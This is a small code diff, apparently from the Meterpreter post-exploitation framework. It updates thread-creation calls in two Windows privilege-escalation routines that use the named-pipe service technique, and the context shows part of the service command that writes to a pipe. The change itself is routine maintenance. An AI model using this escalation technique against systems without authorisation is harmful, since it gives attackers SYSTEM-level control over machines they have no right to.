@@ -143,7 +143,7 @@ DWORD elevate_via_service_namedpipe(Remote * remote, Packet * packet)
 			"cmd.exe /c echo %s > %s", cpServiceName, cServicePipe);
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, NULL);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
@@ -279,7 +279,7 @@ DWORD elevate_via_service_namedpipe2(Remote * remote, Packet * packet)
 		}
 
 		hSem = CreateSemaphore(NULL, 0, 1, NULL);
-		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem);
+		pThread = met_api->thread.create(elevate_namedpipe_thread, &cServicePipe, remote, hSem, NULL);
 		if (!pThread) {
 			BREAK_WITH_ERROR("[ELEVATE] elevate_via_service_namedpipe2. met_api->thread.create failed",
 				ERROR_INVALID_HANDLE);
